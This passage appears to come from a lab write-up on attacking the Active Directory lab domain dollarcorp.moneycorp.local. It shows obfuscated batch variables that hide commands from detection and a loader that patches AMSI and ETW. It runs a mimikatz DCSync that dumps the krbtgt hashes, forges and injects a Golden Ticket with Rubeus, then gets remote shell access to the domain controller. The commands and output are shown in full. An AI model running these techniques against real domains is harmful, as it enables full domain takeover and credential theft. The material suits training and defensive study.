integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8075-9e9e-d00cd035ad6b" class="code code-wrap"><code class="language-Plain Text">[!] Argument Limit: 180 characters
+[+] Enter a string: lsadump::dcsync
+set &quot;z=c&quot;
+set &quot;y=n&quot;
+set &quot;x=y&quot;
+set &quot;w=s&quot;
+set &quot;v=c&quot;
+set &quot;u=d&quot;
+set &quot;t=:&quot;
+set &quot;s=:&quot;
+set &quot;r=p&quot;
+set &quot;q=m&quot;
+set &quot;p=u&quot;
+set &quot;o=d&quot;
+set &quot;n=a&quot;
+set &quot;m=s&quot;
+set &quot;l=l&quot;
+set &quot;Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80eb-9c8d-dff41d51a000" class="">Now let’s load SafetyKatz.exe and execute it from the memory using PELoader.exe.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8085-ad22-f45de57e9b5f" class=""><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args &quot;%Pwn% /user:dcorp\krbtgt&quot; &quot;exit&quot;</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-804c-838a-db4793bc94b0" class="image"><a href="images/screenshot_124.png"><img style="width:2080px" src="images/screenshot_124.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8099-996a-c5257f30c3bd" class="code code-wrap"><code class="language-Plain Text">mimikatz(commandline) # lsadump::dcsync /user:dcorp\krbtgt
+[DC] &#x27;dollarcorp.moneycorp.local&#x27; will be the domain
+[DC] &#x27;dcorp-dc.dollarcorp.moneycorp.local&#x27; will be the DC server
+[DC] &#x27;dcorp\krbtgt&#x27; will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/11/2022 10:59:41 PM
+Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
+    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
+    lm  - 0: ea03581a1268674a828bde6ab09db837
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
+      des_cbc_md5       (4096) : 150ea2e934ab6b80
+
+* Primary:Kerberos *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 150ea2e934ab6b80
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  a0e60e247b498de4cacfac3ba615af01
+    02  86615bb9bf7e3c731ba1cb47aa89cf6d
+    03  637dfb61467fdb4f176fe844fd260bac
+    04  a0e60e247b498de4cacfac3ba615af01
+    05  86615bb9bf7e3c731ba1cb47aa89cf6d
+    06  d2874f937df1fd2b05f528c6e715ac7a
+    07  a0e60e247b498de4cacfac3ba615af01
+    08  e8ddc0d55ac23e847837791743b89d22
+    09  e8ddc0d55ac23e847837791743b89d22
+    10  5c324b8ab38cfca7542d5befb9849fd9
+    11  f84dfb60f743b1368ea571504e34863a
+    12  e8ddc0d55ac23e847837791743b89d22
+    13  2281b35faded13ae4d78e33a1ef26933
+    14  f84dfb60f743b1368ea571504e34863a
+    15  d9ef5ed74ef473e89a570a10a706813e
+    16  d9ef5ed74ef473e89a570a10a706813e
+    17  87c75daa20ad259a6f783d61602086aa
+    18  f0016c07fcff7d479633e8998c75bcf7
+    19  7c4e5eb0d5d517f945cf22d74fec380e
+    20  cb97816ac064a567fe37e8e8c863f2a7
+    21  5adaa49a00f2803658c71f617031b385
+    22  5adaa49a00f2803658c71f617031b385
+    23  6d86f0be7751c8607e4b47912115bef2
+    24  caa61bbf6b9c871af646935febf86b95
+    25  caa61bbf6b9c871af646935febf86b95
+    26  5d8e8f8f63b3bb6dd48db5d0352c194c
+    27  3e139d350a9063db51226cfab9e42aa1
+    28  d745c0538c8fd103d71229b017a987ce
+    29  40b43724fa76e22b0d610d656fb49ddd
+
+
+mimikatz(commandline) # exit
+Bye!</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80f3-b1c1-e1ef8d5d39ac" class="">We got the information needed for KRBTGT account above. Most important information are in red color on output.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801c-8df0-d43e22a75f6b" class="">Let’s now use Rubeus command to generate an OPSEC friendly command for Golden ticket. Note that 3 LDAP queries are sent to the DC to retrieve the required information. We will once again use <strong>ArgsSplit.bat </strong>to encode &quot;<code><strong>golden</strong></code>&quot;:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8039-9135-d33d40b062c9" class="code code-wrap"><code class="language-Plain Text">set &quot;z=n&quot;
+set &quot;y=e&quot;
+set &quot;x=d&quot;
+set &quot;w=l&quot;
+set &quot;v=o&quot;
+set &quot;u=g&quot;
+set &quot;Pwn=%u%%v%%w%%x%%y%%z%&quot;</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806d-bc4c-ccb4e8815f43" class="">After that we can simply execute our Rubeus.exe payload using all the information.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8096-a206-f644ef4350c8" class=""><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-809c-b568-c4a4b311ae30" class="code code-wrap"><code class="language-Plain Text">C:\AD\Tools&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+[*] Applying amsi patch: true
+[*] Applying etw patch: true
+[*] Decrypting packed exe...
+[!] ~Flangvik - Arno0x0x Edition - #NetLoader
+[+] Patched!
+[+] Starting C:\AD\Tools\Rubeus.exe with args &#x27;golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd&#x27;
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Build TGT
+
+[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path &#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27; for &#x27;(samaccountname=Administrator)&#x27;
+[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path &#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27; for &#x27;(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))&#x27;
+[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
+[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully mounted
+[*] Attempting to unmount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
+[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
+[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
+[*] Searching path &#x27;CN=Configuration,DC=moneycorp,DC=local&#x27; for &#x27;(&amp;(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))&#x27;
+[*] Building PAC
+
+[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
+[*] SID            : S-1-5-21-719815819-3726368948-3917688648
+[*] UserId         : 500
+[*] Groups         : 544,512,520,513
+[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] Service        : krbtgt
+[*] Target         : dollarcorp.moneycorp.local
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for &#x27;Administrator@dollarcorp.moneycorp.local&#x27;
+
+[*] AuthTime       : 6/1/2024 7:43:48 PM
+[*] StartTime      : 6/1/2024 7:43:48 PM
+[*] EndTime        : 6/2/2024 5:43:48 AM
+[*] RenewTill      : 6/8/2024 7:43:48 PM
+
+[*] base64(ticket.kirbi):
+
+      doIGJDCCBiCgAwIBBaEDAgEWooIE3jCCBNphggTWMIIE0qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
+      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
+      BHowggR2oAMCARKhAwIBA6KCBGgEggRkSDu/Skuemv4GzQGqy67JjvjvZVMPveRBIl4ecVXDZmR0G+/B
+      we6dU3UAeRlIM59vZY/KpwGX3+WukJIjso09iq4SALE720c9rc1v93BQb7l5Zqo2+8HrBFSeJCoCBwpq
+      +j3gnZOee9eqDFxv8l4HWMuzpVW2UQl+Up6S3WHqQAOea/n33H+Ch+zmstBntzgUbbiweonYW7tUvQwA
+      wGJltuoE8IbTak+2MYn6TNvhU2/hvRXwtXsKi7nVjuj8p98elo1Mmrq/l0dw0WXcSzGSOBw5fORVu3+U
+      3IFra/Uo1a94zh5TzRS2YmVp8OYq94EkizzG/etgcDWLyny1x7TzvSJwDmRRKvwTSXnj1Dlmk7TWCbx6
+      OMzCa6NjLn0D9TQ0cz0ITvVIN7Tli3SJnj7UF3YTwOIlRmh+l8SjCLNgRVOg65T0M6H1WNbCLdJd/eOZ
+      kqxIc4plDoSMdhMaiIjp+xwzCL6w1ce2txLI3jy1GNm3HmjumXJoJE6UJX8nbWJswP7XraQlyv4wQ5lu
+      KoX7Bec2XIHCRdhfM6+pbNsJR6WH9NwFYh1MwZ+ZemjbKh+z8zsRKKmuTp5guZbkPWuRGSc9KUJeyLDT
+      y21Zo4KuvYq6XFNm4x2XZm8++AQnGFNjqXDDCyqLtAEwaDqtblOxDRr/u8Azwn58nIDj4g3RMXgDCuwx
+      BPKksayH8TkpkVaCfP7w0Pe0Kka0bqi3RhftXFk6P8SRvRlR1Fe1KEp7ovRtC2WsloLVYn0jEZgJrk+9
+      YRlRCf6Vs3783+aZrP/N2hNbBSkF4BXOsN4hGDsygvSQIeht/srUDuXNfyIgiF5Fg7m/ZofbR3PrSQ7V
+      sUR3nj0rFjXMPJqsWNWFcP/NMLzuU7BrrlO3XC2SaSd1UpGCnbgZ5mTlKporH2RFtE5bJkw5uI5ELT+4
+      FF0xa6lz4YasMiFt3dNIcTQMsNE/z+ID+g2EgK6hSYIIP60Cz9ukg0/xDoK3WJakNV15AruAh+GeLWtk
+      ef+BYENgSpVxvQihcRUOyBooWfJXDctYlwvPBrDjB8j63CdLUX+wz38XToRxHLwCljLRcUTQGD3x1IlC
+      GJ21HfUfCS9nQoxhpjrqrLUvI9WhhRJy/Vgx2YueE2DjJZHs7rpmZW9zZ0VK4X0r4MqM+d1pJQq8G9OK
+      BEPR1VVyFNXQQqh3A/5uhWXvzhXexmsEeFGRTCa5q8DQkfamJSZSKY8DU40HtKW9EsVNYyzLUfemd+aQ
+      Ydf1Uxbh+Lodr6Sl1bAV2LDbsIx0mKmlLnvKQb+cwU6Gc8Exm0/gQ3R9a58qGzpsPjRPYD11wbgiSh2J
+      D4vhKCgD4eW9iJtMSP1UUoIZ3SDFgWYFOfRZA1cJXJinfV57DzYRrlBZkzA7oaa5/+/vJYSkau/f5TGL
+      yiqeM0xToXKM3v+MsSb9FblQDR1C4LyDz6AQTQ92g2ggW/avX9PEtgNqpJeU70/KtvW3cULg5k8VeX1X
+      z5tRvmgwA2OjggEwMIIBLKADAgEAooIBIwSCAR99ggEbMIIBF6CCARMwggEPMIIBC6ArMCmgAwIBEqEi
+      BCB26BGUo5JCelxiRKcSoG+Z+AStCIDYmpGX57IuC6wBzqEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5M
+      T0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDgAACkERgPMjAyNDA2MDIwMjQzNDha
+      pREYDzIwMjQwNjAyMDI0MzQ4WqYRGA8yMDI0MDYwMjEyNDM0OFqnERgPMjAyNDA2MDkwMjQzNDhaqBwb
+      GkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3Jw
+      Lm1vbmV5Y29ycC5sb2NhbA==
+
+
+
+[*] Printing a command to recreate a ticket containing the information used within this ticket
+
+C:\AD\Tools\Loader.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:&quot;11/11/2022 6:33:55 AM&quot; /minpassage:1 /logoncount:4629 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-802a-83c5-d241e2b96547" class="">We can see above output that  it worked fine and It was able to generate the command I highlighted in <code><strong>RED</strong></code>.<br/>Let’s now use the just generate command above to forge a Golden ticket. Remember to add <code><strong>/ptt</strong></code> at the end of the generated command to inject it in the current process. Once the ticket is injected, we can access resources in the domain.<br/>Note that we will once again use Loader.exe and ArgsSplit.bat to encode &quot;<code><strong>golden</strong></code>&quot; .</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807f-acf2-c014a7f6c72e" class="">Please pay attention that the command generated doesn’t include Rubeus.exe, so we need to add it and its <code><strong>-args</strong></code> flag as well.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-804d-a3b5-f1dbb4cd318b" class=""><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:&quot;11/11/2022 6:33:55 AM&quot; /minpassage:1 /logoncount:4629 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80ff-b22a-d9102da3f55c" class="image"><a href="images/screenshot_126.png"><img style="width:2112px" src="images/screenshot_126.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a3-98aa-efdd1afa7760" class="">That’s great we were able to generate a forged Golden Ticket and inject  it into the current process. we can now access resources in the domain.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8098-8bee-e62582628da1" class="">We do have injected the Golden Ticket into the process to let’s try to access the Domain Controller using WinRS and check what user are we now.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807d-b57c-ebccb64cb199" class=""><code>winrs -r:dcorp-dc cmd</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80f4-a43b-fc6deb1b05d8" class="image"><a href="images/screenshot_127.png"><img style="width:1445px" src="images/screenshot_127.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8023-ac0f-df7186a82cc6" class="">Voila. Above we can see that we are Administrator Account.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto">
+        </section>
+      </article>
+    </div>
+
+    <script src="../assets/js/script.js"></script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg2.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  </body>
+</html>
